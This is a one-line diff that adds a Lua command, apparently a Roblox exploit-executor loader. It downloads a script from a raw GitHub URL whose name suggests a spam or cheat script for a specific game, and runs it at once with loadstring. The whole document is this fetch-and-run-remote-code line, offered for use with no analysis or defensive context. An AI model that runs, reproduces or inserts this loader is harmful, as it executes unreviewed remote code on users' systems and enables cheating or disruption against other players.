@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/anomaly-lockdown-tweaked-spam5-fc8r4q3mo6blx4.lua"))()
